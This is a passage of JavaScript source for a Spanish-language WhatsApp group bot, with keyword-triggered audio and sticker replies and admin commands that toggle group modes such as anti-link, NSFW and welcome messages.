				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("kobarashi")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/kobarashi.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Kobarashi >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("kataka")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/kataka.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Kataka >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("jai")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/jai.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Jai... >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("jentai")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/hentai.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Jentai 7w7`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("asennn")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/asen.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Asennn! >o<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (automensajesxd.includes("anana")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audiouwu/anana.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Anana >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			//
			if (budy.includes("papu papu") || (budy.includes("Papu papu"))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				teslagod.updatePresence(from, Presence.recording)
				var papux = fs.readFileSync('./multimedia/sonidos/audishitxd/papus.m4a')
				teslagod.sendMessage(from, papux, MessageType.audio, {
					quoted: fvn,
					mimetype: 'audio/mp4',
					ptt: true
				})
				var ressult = fs.readFileSync(`./multimedia/misstks/sticker/papudance.webp`)
				teslagod.sendMessage(from, ressult, sticker, {
					quoted: fakemek
				})
				await limitAdd(sender)
			}
			if (budy.includes("ª")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var audioxdc = fs.readFileSync('./multimedia/sonidos/audishitxd/aaa.m4a')
				teslagod.sendMessage(from, audioxdc, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `ª`,
							body: `ª`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (budy.includes("ara ara") || (budy.includes("Ara ara"))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var audioxdc = fs.readFileSync('./multimedia/sonidos/audiouwu/araara.mp3');
				teslagod.sendMessage(from, audioxdc, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Ara-ara >~<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (budy.includes("yamete") || (budy.includes("Yamete"))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var audioxdc = fs.readFileSync('./multimedia/sonidos/audiouwu/ya.mp3');
				teslagod.sendMessage(from, audioxdc, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Yamete >//<`,
							body: `Matt_Mdz`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (budy.includes("buenos dias") || (budy.includes("Buenos dias") || (budy.includes("buenos días") || (budy.includes("Buenos días"))))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var audioxdc = fs.readFileSync('./multimedia/sonidos/audishitxd/Bdia.m4a');
				teslagod.sendMessage(from, audioxdc, MessageType.audio, {
					quoted: fakemek,
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
			}

			//
			if (budy.includes("si 👍") || (budy.includes("Si 👍"))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audishitxd/si_sp.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Si 👍`,
							body: `Joseph_A`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (budy.includes("no returbio") || (budy.includes("No returbio") || (budy.includes("No re turbio") || (budy.includes("No re turbio"))))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audishitxd/turrbio.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `No!, Re-Turbio... ._.`,
							body: `Joseph_A`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (budy.includes("oh me vengo") || (budy.includes("Oh me vengo"))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audishitxd/ohhh_xd.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `Oh! me vengo... 🥵`,
							body: `Joseph_A`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (budy.includes("con flores") || (budy.includes("Con flores"))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audishitxd/con_flores.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `🥀 Con flores... 🌹`,
							body: `Joseph_A`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (budy.includes("no digas eso papu") || (budy.includes("No digas eso papu"))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var filezzz = fs.readFileSync('./multimedia/sonidos/audishitxd/no_papu.m4a');
				teslagod.sendMessage(from, filezzz, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `No papu :'v`,
							body: `Joseph_A`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			if (budy.includes("no chupala") || (budy.includes("No chupala"))) {
				if (isBaneado) return
				if (isLimit(sender)) return
				var audioxdc = fs.readFileSync('./multimedia/sonidos/audishitxd/no-chupala.m4a');
				teslagod.sendMessage(from, audioxdc, MessageType.audio, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `No, chupala... 😎`,
							body: `Joseph_A`,
							sourceUrl: reddom,
							thumbnail: userthumb
						}
					},
					mimetype: 'audio/mp4',
					ptt: true
				})
				await limitAdd(sender)
			}
			////Alabado :v
			if (automensajesxd.includes("tesla")) {
				if (isBaneado) return
				if (isLimit(sender)) return
				const d = fs.readFileSync('./multimedia/misstks/sticker/teslagod.webp');
				teslagod.sendMessage(from, d, sticker, {
					quoted: {
						key: {
							participant: "0@s.whatsapp.net",
							"remoteJid": "0@s.whatsapp.net"
						},
						"message": {
							"groupInviteMessage": {
								"groupJid": "51995386439-1616169743@g.us",
								"inviteCode": "m",
								"groupName": "P",
								"caption": `Nikola Tesla:\n10-07-1856\n07-01-1943`,
								'jpegThumbnail': fs.readFileSync('./multimedia/imagenes/teslagod.jpeg')
							}
						}
					}
				})
				await limitAdd(sender)
			}

			//weas que hice :v //

			//====================COMANDOS 1=====================//
			switch (rtpuwu) {
				case '...': {
					reply('...')
				}
				break
			}
			//====================COMANDOS 2=====================//
			switch (command) {
				case 'rebote': {
					if (isBaneado) return
					if (isLimit(sender)) return
					const timesmpp = speed()
					const latensix = speed() - timesmpp
					const conexiont = `${latensix.toFixed(4)} MS`
					const pinpoon = ['Pierde la partida*\nFong 🏓', '🏓 Pong!!! 🏓', '🏓 Pong!!! 🏓', 'Pong 🏓', 'Pong 🏓', 'Pong 🏓', 'Pong 🏓', 'Responde con un golpe a 160 kmh*\nPong 🏓', 'Pong 🏓', 'Pong 🏓', 'Le da un golpe en la cabeza*\nPong 🏓', 'Pong 🏓', 'Pong 🏓', 'Le rompe el craneo*\nPong!!!🏓', 'Pong 🏓', 'Pong 🏓', 'Pong 🏓', 'Pong 🏓', 'Le gana la partida*\n🏓 Pong!!! 🏓', 'Lo mata*\nPong!!! 🏓🏓🏓']
					const pinpon3 = pinpoon[Math.floor(Math.random() * (pinpoon.length))]
					reply(pinpon3 + `\n\nVelocidad de respuesta : ${conexiont} Milisegundos`)
				}
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				await limitAdd(sender)
				break
			case 'despedida': {
				if (isBaneado) return
				if (isLimit(sender)) return
				var adiuuu = fs.readFileSync('./multimedia/sonidos/audiouwu/adiu.m4a');
				teslagod.sendMessage(from, adiuuu, MessageType.audio, {
					quoted: fakemek,
					mimetype: 'audio/mp4',
					ptt: true
				})
			}
			await limitAdd(sender)
			await limitAdd(sender)
			await limitAdd(sender)
			await limitAdd(sender)
			await limitAdd(sender)
			await limitAdd(sender)
			await limitAdd(sender)
			await limitAdd(sender)
			await limitAdd(sender)
			await limitAdd(sender)
			break

			//⚡ CMDS ⚡//

			case 'nuebot':
			case 'jadibot':
			case "serbot":
			case 'rentbot': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (isGroup) return teslagod.sendMessage(from, `${senderNumber} por favor lee estas reglas para convertirte en bot sin problemas >~<
${monospace}
1.- Tener 2 dispositivos cerca para escanear el código QR, no uses este comando si no sabes que hacer.
2.- Si pides los códigos QR y no lo escaneaste, seras bloqueado automáticamente, y el desbloqueo dependera del dueño del bot.
3.- No podras ser subbot siendo bot!, y si eres el dueño del bot causarás error al bot >:v
${monospace}`, MessageType.text, {
					sendEphemeral: true,
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `[ ! ] Codigo QR solo por chat interno`,
							"body": `No olvides leer las reglas 🤓`,
							"previewType": "PHOTO",
							"thumbnail": mylogo,
							"sourceUrl": `${reddom}`
						},
						mentionedJid: [sender]
					}
				})
				if (Matt_M && autonomo && isTeslaUser) {
					reply(`No puedes convertirse en subbot siendo bot!`)
				} else {
					jadibot(reply, teslagod, from).catch(e => {
						console.log(e)
						reply(`Usuario bloqueado por pedir el código QR en vano...`)
						teslagod.blockUser(sender, "add")
					})
				}
			}
			addFilter(from)
			await limitAdd(sender)
			break
			case "stopnuebot": {
				if (!autonomo) return reply("Esto no funciona bien x'd");
				stopjadibot(reply, teslagod, from)
			}
			break


			//Activadores
			case 'modofull':
			case 'fullmodo': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (UwU === 'activado') {
					if (isDiversion) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_diversion.push(from)
					fs.writeFileSync('./basededatos/json/modofull.json', JSON.stringify(_diversion))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_diversion.splice(from, 1)
					fs.writeFileSync('./basededatos/json/modofull.json', JSON.stringify(_diversion))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 MODO-FULL 」`, `Info:\nᴱˢᵗᵉ ᵐᵒᵈᵒ ᵃᶜᵗᶦᵛᵃ ˡᵃ ᵐᵃʸᵒʳᶦ́ᵃ ᵈᵉ ᶜᵒᵐᵃⁿᵈᵒˢ ᑫᵘᵉ ᶜᵒⁿᵗᶦᵉⁿᵉ ᵉˡ ᵇᵒᵗ`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			case 'animeuwu':
			case 'modoanime':
			case 'animemodo': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (UwU === 'activado') {
					if (isAnime) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_anime.push(from)
					fs.writeFileSync('./basededatos/json/anime.json', JSON.stringify(_anime))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_anime.splice(from, 1)
					fs.writeFileSync('./basededatos/json/anime.json', JSON.stringify(_anime))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 MODO-ANIME 」`, `Info:\nᴱˢᵗᵉ ᵐᵒᵈᵒ ᵃᶜᵗᶦᵛᵃ ˡᵒˢ ᶜᵒᵐᵃⁿᵈᵒˢ ᵒᵗᵃᵏᵘˑᵃⁿᶦᵐᵉ`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			case 'hmodo':
			case 'modoh': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (UwU === 'activado') {
					if (isNsfw) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_nsfw.push(from)
					fs.writeFileSync('./basededatos/json/nsfw.json', JSON.stringify(_nsfw))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_nsfw.splice(from, 1)
					fs.writeFileSync('./basededatos/json/nsfw.json', JSON.stringify(_nsfw))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 MODO-H 7w7 」`, `Info:\nᴱˢᵗᵉ ᵐᵒᵈᵒ ᵃᶜᵗᶦᵛᵃ ˡᵒˢ ᶜᵒᵐᵃⁿᵈᵒˢ ʰᵉⁿᵗᵃᶦ ⁺¹⁸`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			case 'nivelear':
			case 'levelear': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (UwU === 'activado') {
					if (isLevelingOn) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_leveling.push(from)
					fs.writeFileSync('./basededatos/usuariosgod/leveling.json', JSON.stringify(_leveling))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_leveling.splice(from, 1)
					fs.writeFileSync('./basededatos/usuariosgod/leveling.json', JSON.stringify(_leveling))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 NIVELEAR 」`, `Info:\nᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ᵃᶜᵗᶦᵛᵃ ᵘⁿ ⁿᶦᵛᵉˡ ᶦⁿᵗᵉʳᵃᶜᵗᶦᵛᵒ ᵖᵃʳᵃ ˡᵒˢ ᵖᵃʳᵗᶦᶜᶦᵖᵃⁿᵗᵉˢ`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			//
			case 'wlc':
			case 'welcome':
			case 'bienbenida': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (UwU === 'activado') {
					if (isWelcom) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_welcom.push(from)
					fs.writeFileSync('./basededatos/json/bienvenida.json', JSON.stringify(_welcom))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_welcom.splice(from, 1)
					fs.writeFileSync('./basededatos/json/bienvenida.json', JSON.stringify(_welcom))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 BIENBENIDA-AUTOMÁTICA 」`, `Info:\nᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ᵃᶜᵗᶦᵛᵃ ˡᵃˢ ᵇᶦᵉⁿᵛᵉⁿᶦᵈᵃˢ ᵃᵘᵗᵒᵐᵃ́ᵗᶦᶜᵃˢ`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			case 'antiviruz':
			case 'antivirus':
			case 'antitraba':
			case 'antitrava':
			case 'antitrabas':
			case 'antitravas': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (UwU === 'activado') {
					if (isAntivirtex) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_antivirtex.push(from)
					fs.writeFileSync('./basededatos/json/antitrabas.json', JSON.stringify(_antivirtex))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_antivirtex.splice(from, 1)
					fs.writeFileSync('./basededatos/json/antitrabas.json', JSON.stringify(_antivirtex))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 ANTI-TRABAS 」`, `Info:\nᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ᵃᶜᵗᶦᵛᵃ ᵖʳᵒᵗᵉᶜᶜᶦᵒ́ⁿ ᴬⁿᵗᶦ ᵗʳᵃᵇᵃˢ ᵉⁿ ᵂʰᵃᵗˢᵃᵖᵖ`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			case 'antilink': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (UwU === 'activado') {
					if (isAntiLink) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_antilink.push(from)
					fs.writeFileSync('./basededatos/json/antilink.json', JSON.stringify(_antilink))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_antilink.splice(from, 1)
					fs.writeFileSync('./basededatos/json/antilink.json', JSON.stringify(_antilink))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 ANTI-LINK 」`, `Info:\nᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ᵃᶜᵗᶦᵛᵃ ᵖʳᵒᵗᵉᶜᶜᶦᵒ́ⁿ ᴬⁿᵗᶦ ˡᶦⁿᵏˢ ᵈᵉ ʷʰᵃᵗˢᵃᵖᵖ ʸ ᵒᵗʳᵃˢ ʳᵉᵈᵉˢ ˢᵒᶜᶦᵃˡᵉˢ`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			case 'antilink2': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (UwU === 'activado') {
					if (isAntiLinkuwu) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_antilink2.push(from)
					fs.writeFileSync('./basededatos/json/antilink2.json', JSON.stringify(_antilink2))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_antilink2.splice(from, 1)
					fs.writeFileSync('./basededatos/json/antilink2.json', JSON.stringify(_antilink2))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 ANTI-LINK-MULTIPLE 」`, `Info:\nᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ᵃᶜᵗᶦᵛᵃ ᵖʳᵒᵗᵉᶜᶜᶦᵒ́ⁿ ᴬⁿᵗᶦ ˡᶦⁿᵏˢ ʸ ᵉⁿˡᵃᶜᵉˢ ᵐᵘˡᵗᶦᵖˡᵉˢ`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			case 'antifakes': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (UwU === 'activado') {
					if (isFakes1) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_antifakes1.push(from)
					fs.writeFileSync('./basededatos/json/nofakes1.json', JSON.stringify(_antifakes1))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_antifakes1.splice(from, 1)
					fs.writeFileSync('./basededatos/json/nofakes1.json', JSON.stringify(_antifakes1))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 ANTI-FALSOS 」`, `Info:\nᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ᵃᶜᵗᶦᵛᵃ ᵖʳᵒᵗᵉᶜᶜᶦᵒ́ⁿ ᴬⁿᵗᶦ ⁿᵘᵐᵉʳᵒˢ ᶠᵃˡˢᵒˢ ᵒ ᵛᶦʳᵗᵘᵃˡᵉˢ`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			case 'antifakes2': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (UwU === 'activado') {
					if (isFakes2) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_antifakes2.push(from)
					fs.writeFileSync('./basededatos/json/nofakes2.json', JSON.stringify(_antifakes2))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_antifakes2.splice(from, 1)
					fs.writeFileSync('./basededatos/json/nofakes2.json', JSON.stringify(_antifakes2))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 ANTI-FALSOS-2 」`, `Info:\nᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ᵃᶜᵗᶦᵛᵃ ᵖʳᵒᵗᵉᶜᶜᶦᵒ́ⁿ ᶜᵒⁿᵗʳᵃ ⁿᵘᵐᵉʳᵒˢ ᵉˢᵗᵃᵈᵒᵘⁿᶦᵈᵉⁿˢᵉˢ ⁺¹`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			case 'antiestranjeros':
			case 'antiextranjeros': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (UwU === 'activado') {
					if (isEstranjeros) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_estranjerosnot.push(from)
					fs.writeFileSync('./basededatos/json/noextranjeros.json', JSON.stringify(_estranjerosnot))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_estranjerosnot.splice(from, 1)
					fs.writeFileSync('./basededatos/json/noextranjeros.json', JSON.stringify(_estranjerosnot))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 ANTI-EXTRANJEROS 」`, `Info:\nᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ᵃᶜᵗᶦᵛᵃ ᵖʳᵒᵗᵉᶜᶜᶦᵒ́ⁿ ᶜᵒⁿᵗʳᵃ ⁿᵘᵐᵉʳᵒˢ ᵈᶦˢᵗᶦⁿᵗᵒˢ ᵃˡ ᵖʳᵉᶠᶦʲᵒ ᵈᵉˡ ᵈᵘᵉⁿ̃ᵒ`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			//
			case 'chatbot': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (UwU === 'activado') {
